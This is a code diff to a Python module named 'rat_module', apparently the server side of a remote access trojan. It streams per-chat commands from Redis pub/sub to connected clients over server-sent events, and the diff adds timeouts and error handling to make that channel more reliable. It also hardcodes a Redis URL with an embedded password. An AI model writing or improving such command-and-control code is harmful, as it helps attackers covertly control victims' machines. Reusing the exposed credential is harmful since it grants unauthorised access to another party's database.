@@ -16,13 +16,15 @@ REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
 if REDIS_URL.startswith("redis-cli"):
     REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
 
-# التحقق من الـ Scheme وإصلاحه تلقائياً إذا كان خاطئاً أو مفقوداً
+# إصلاح الـ Scheme إذا كان مفقوداً أو غير مطابقة
 if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
     REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"
 
+redis_client = None
 try:
-    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)
+    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=10)
     redis_client.ping()
+    print("[+] Redis connection established successfully in rat_module.")
 except Exception as e:
     print(f"[-] Critical Redis Connection Error in rat_module: {e}")
     redis_client = None
@@ -217,20 +219,20 @@ def init_rat_routes(app, bot):
         def event_stream():
             if not redis_client:
                 return
-            pubsub = redis_client.pubsub()
-            pubsub.subscribe(f"channel_cmd:{chat_id}")
-            yield f"data: {json.dumps({'action': 'ping'})}\n\n"
+            try:
+                pubsub = redis_client.pubsub()
+                pubsub.subscribe(f"channel_cmd:{chat_id}")
+                yield f"data: {json.dumps({'action': 'ping'})}\n\n"
 
-            while True:
-                try:
+                while True:
                     message = pubsub.get_message(ignore_subscribe_messages=True, timeout=15)
                     if message:
                         action_data = message['data']
                         yield f"data: {json.dumps({'action': action_data})}\n\n"
                     else:
                         yield f"data: {json.dumps({'action': 'heartbeat'})}\n\n"
-                except Exception:
-                    break
+            except Exception:
+                pass
 
         return Response(stream_with_context(event_stream()), mimetype="text/event-stream")
 
